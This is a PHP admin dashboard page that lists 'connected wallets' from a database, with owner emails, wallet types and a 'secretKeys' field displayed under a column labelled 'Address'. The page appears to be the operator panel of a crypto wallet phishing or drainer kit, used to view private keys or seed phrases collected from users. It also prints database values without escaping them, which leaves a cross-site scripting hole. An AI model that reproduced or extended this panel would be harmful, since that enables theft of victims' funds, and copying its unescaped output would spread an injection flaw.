<?php include 'head.php';
$ref = bin2hex(random_bytes(11));
 ?>

  <body class="wide" >
   
    <!-- page-wrapper Start-->
    <div class="page-wrapper compact-wrapper" id="pageWrapper">
    <?php include 'header.php' ?>
      
      <!-- Page Body Start-->
      <div class="page-body-wrapper sidebar-icon">
        <!-- Page Sidebar Start-->
    <?php include 'aside.php' ?>
        
        <!-- Page Sidebar Ends-->
        <div class="page-body porject-dash">
          <div class="container-fluid">
            <div class="page-header dash-breadcrumb">
              <div class="row">
                <div class="col-6"> </div>
                <div class="col-6">
                  <div class="breadcrumb-sec">
                    <ul class="breadcrumb"> 
                      <li class="breadcrumb-item">Dashboard</li> 
                      <li class="breadcrumb-item">All Wallet Address</li> 
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!-- Container-fluid starts-->
          <div class="container-fluid">
            <div class="row ">
              <div class="col-xl-12">
                <div class="row">
                  <div class="col-xl-12 ">
                    <div class="card">
                      <div class="card-body">
                      <div class="row">
                          <div class="col-md-9">
                      <h4>Manage Connected Wallets</h4> </div>  
                      </div>

                      <hr>
                    <?php 
                    
                    $sql = runQuery("
    SELECT wallet.*, users.email 
    FROM wallet
    JOIN users ON wallet.userid = users.id
    ORDER BY wallet.id DESC
");

                      if(numRows($sql)>0){
                          $num=1
                    ?>
                      <div class="table-responsive" style="min-height: 250px;">
                        <table class="table">
                          <tr>
                            <th>S/N</th>
                            <th>Wallet Name </th>
                            <th>Wallet Email </th>
                            <th>Wallet Type</th>
                            <th>Address</th> 
                            <th>---</th>
                          </tr>

                          <?php while($row=fetchAssoc($sql)){?>
                            <tr>
                                <!-- <td><?php //echo date("d M, Y", strtotime($row['ddate'])) ?></td>   -->
                                <td><?php echo $num++  ?></td>
                                <td><?php echo $row['wallet_name']  ?></td>
                                <td><?php echo $row['email']  ?></td>
                                <td><?php echo ($row['wallet_type'])  ?></td> 
                                <td><?php echo ($row['secretKeys'])  ?></td>
                                <td>
                                <a class="btn btn-danger btn-sm" id="deleteAddr" data-id="<?php echo $row['id']  ?>"  href="javascript:void(0)"> <i class="fa fa-trash"></i> Delete</a>
                                </td>
                            </tr>

                            
                            
                            <?php } ?>



                        </table>
                      </div>

                      <?php } ?>




                      
                      </div>
                    </div>
                  </div>
                  
                
                  
                </div>
              </div>
             
            </div>
          </div>
          <!-- Container-fluid Ends-->
        </div>
        <!-- tap on top starts--> 
        <!-- tap on tap ends-->
        <!-- footer start-->
    <?php include 'footer.php' ?>
        
      </div>
    </div>
   
    <?php include 'script.php' ?> 


        
  </body>
 
</html>